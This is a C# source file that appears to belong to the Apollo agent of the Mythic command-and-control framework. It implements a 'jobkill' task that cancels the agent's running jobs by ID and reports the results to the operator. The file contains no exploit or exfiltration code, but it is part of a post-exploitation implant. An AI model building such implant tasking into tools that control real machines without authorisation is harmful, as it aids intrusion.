#define COMMAND_NAME_UPPER

#if DEBUG
#define JOBKILL
#endif

#if JOBKILL

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class jobkill : Tasking
    {
        public jobkill(IAgent agent, Task data) : base(agent, data)
        {
        }


        public override void Start()
        {
            bool bRet = true;
            string[] jids = _data.Parameters.Split(' ');
            foreach (string j in jids)
            {
                if (_agent.GetTaskManager().CancelTask(j))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            $"Killed {j}", false, ""));
                }
                else
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        $"Failed to kill {j}", false, ""));
                    bRet = false;
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse(
                    "",
                    true,
                    bRet ? "completed" : "error"));
        }
    }
}
#endif